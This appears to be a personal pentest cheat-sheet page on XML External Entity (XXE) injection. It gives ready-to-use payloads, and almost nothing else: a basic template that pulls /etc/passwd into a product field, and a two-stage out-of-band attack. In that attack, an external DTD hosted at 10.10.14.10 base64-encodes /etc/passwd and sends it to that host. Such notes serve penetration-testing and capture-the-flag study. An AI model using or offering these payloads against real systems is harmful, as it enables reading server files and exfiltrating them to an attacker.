---
title: "XXE (XML External Entity)"
date: 2024-7-5
tags: ["xxe", "xml", "dtd", "web"]
---

---
### XXE Template

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY data SYSTEM "/etc/passwd">]>
<product>
    <id>&data;</id>
    <price></price>
</product>
```

### External DTD (2 stage)

```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://10.10.14.10/data?%data;'>">
```

<br>

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % bar SYSTEM "http://10.10.14.10/evil.dtd">
        %bar;
        %eval;
]>
<product>
    <id>&exfil;</id>
    <price></price>
</product>
```

<br>